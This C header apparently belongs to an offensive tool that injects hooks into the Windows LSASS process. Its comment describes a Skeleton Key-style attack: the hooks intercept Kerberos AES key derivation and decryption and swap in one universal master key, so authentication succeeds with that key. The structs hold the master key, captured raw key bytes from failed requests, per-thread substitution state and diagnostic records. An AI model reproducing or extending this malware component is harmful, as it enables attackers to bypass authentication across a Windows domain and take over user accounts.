/*
 * derive_ctx.h — shared layout between the injected PIC hooks
 * (hook_aes_derive.c + hook_aes_decrypt2.c) and the driver-side tools.
 * One RW page allocated in LSASS by skelinstall_derive.exe.
 *
 * v8 — FIXED-KEY (one universal master key, no arm table):
 *   mode 0 = DIAG (forward untouched, record)
 *   mode 2 = CONDITIONAL adaptive:
 *     - decrypt hook: on wrong-key failure (0x8009030F) captures the failed
 *       request's raw key bytes (from the derive-time stash) and stages
 *       {pendKey -> pendMraw = the universal masterKey}
 *     - derive hook (usage 1): input bytes == pendKey -> substitute the input
 *       pointer with {masterLen, masterKey} (CTX-resident); mark thread
 *     - derive hook (usage 3): thread marked -> substitute (AS-REP keyed
 *       with the same master key)
 *   Real passwords never leave the natural path. NO writes to LSASS-owned
 *   memory anywhere. (tab[]/arm-table removed in v8 — this shrinks SKD_CTX
 *   from 21 KB to ~3 KB, which also fixed a BOF stack overflow.)
 */
#ifndef DERIVE_CTX_H
#define DERIVE_CTX_H

#include <stdint.h>

#define SKD_MAGIC   0x314B5644u   /* 'DVK1' */
#define SKD_VER     8
#define SKD_REC_N   8
#define SKD_TID_N   16
#define SKD_CTX_SZ  0x8000

#pragma pack(push, 1)
typedef struct {
    uint64_t seq;
    uint64_t tid;
    uint64_t thisPtr;
    uint64_t keyPtr;      /* arg3 as received */
    uint64_t outPtr;      /* arg2 */
    uint64_t a6Ptr;       /* decrypt hook: arg6 (baseSpec wrapper) */
    uint32_t usage;
    uint32_t scenario;
    uint32_t slotId;      /* 1=Aes3962 derive, 2=Aes8009 derive, 3=decrypt */
    uint32_t status;      /* *(uint32_t*)(out+0x10) after orig */
    uint32_t lenObserved; /* *(uint32_t*)keyPtr */
    uint32_t bufSrcIdx;   /* which qword (1..4) the buf copy came from */
    uint32_t bufLen;
    uint32_t substituted;
    uint32_t retried;
    uint32_t retryOk;
    uint64_t q0, q1, q2, q3, q4; /* raw qwords at keyPtr+0x00..+0x20 */
    uint64_t a6q0, a6q1;
    uint8_t  buf[32];     /* 32 bytes from first pointer-looking qword */
} SKD_REC;

typedef struct {
    uint64_t tid;         /* 0 = slot free */
    uint64_t masterBlob;  /* unused (retry removed) */
    uint32_t masterUsed;  /* u1 substituted -> u3 must substitute */
    uint32_t altStatus;
    uint8_t  altOut[32];
    uint64_t altQ0, altQ1;
    uint32_t wLen;        /* derive-time wrapper len (raw key) */
    uint32_t wPad;
    uint64_t wPtr;        /* derive-time wrapper buf ptr (raw key bytes) */
} SKD_TIDREC;

typedef struct {
    /* header — 32 bytes */
    uint32_t magic;
    uint32_t ver;
    int32_t  mode;
    uint32_t _pad0;
    uint64_t slotA;
    uint64_t slotB;
    volatile uint64_t fires;
    volatile uint64_t substHits;
    volatile uint64_t recIdx;
    volatile uint64_t retries;
    volatile uint64_t retryOk;
    /* active substitution input struct: {len@0, buf@8} — keep adjacent */
    uint32_t subLen;
    uint32_t _pad1;
    uint64_t subBuf;      /* = ctx address + offsetof(masterKey) */
    uint8_t  masterKey[32];  /* universal master raw key (PBKDF2, fixed salt) */
    uint32_t masterLen;
    uint32_t _pad2;
    /* adaptive pending entry (decrypt capture -> derive consume) */
    uint32_t pendKlen;    /* 0 = none */
    uint32_t pendMlen;
    uint8_t  pendKey[32];
    uint8_t  pendMraw[32];
    volatile uint64_t pendSeq;
    /* per-thread conditional table */
    SKD_TIDREC tid[SKD_TID_N];
    /* diagnostics ring */
    SKD_REC rec[SKD_REC_N];
} SKD_CTX;
#pragma pack(pop)

#endif /* DERIVE_CTX_H */
